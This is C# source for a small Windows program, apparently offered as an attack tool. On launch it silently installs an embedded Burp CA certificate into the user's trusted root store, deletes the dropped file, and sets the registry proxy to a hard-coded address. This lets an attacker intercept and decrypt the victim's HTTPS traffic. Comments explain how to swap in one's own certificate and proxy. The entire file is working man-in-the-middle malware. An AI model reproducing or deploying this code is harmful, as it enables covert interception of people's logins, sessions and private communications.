//Coded By 0xyg3n and Tehtafara0 with love <3 
//Use it Wisely.
//You can use Burp to generate the CA , import it to the code and then use the proxy with port forward.

using Microsoft.Win32;
using System;
using System.IO;
using System.Security.Cryptography.X509Certificates;

namespace Prism
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\prism.der", Properties.Resources.burp);
            string file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\prism.der";
            X509Store store = new X509Store(StoreName.Root, StoreLocation.CurrentUser);
            X509Certificate2 certificate = new X509Certificate2(file); // File = Your Certificate, Add this from Resources (Solution Explorer).
            store.Open(OpenFlags.ReadWrite);
            store.Add(certificate);
            store.Close();
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\prism.der");
            RegistryKey reg_key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", true); //Change this line if you want to install the Certificate for all users but it requires UAC Promt.
            reg_key.SetValue("ProxyServer", "192.168.1.123:8080"); //Change this with your Proxy , it can also be DNS.
            reg_key.SetValue("ProxyEnable", 1);
        }
    }
}
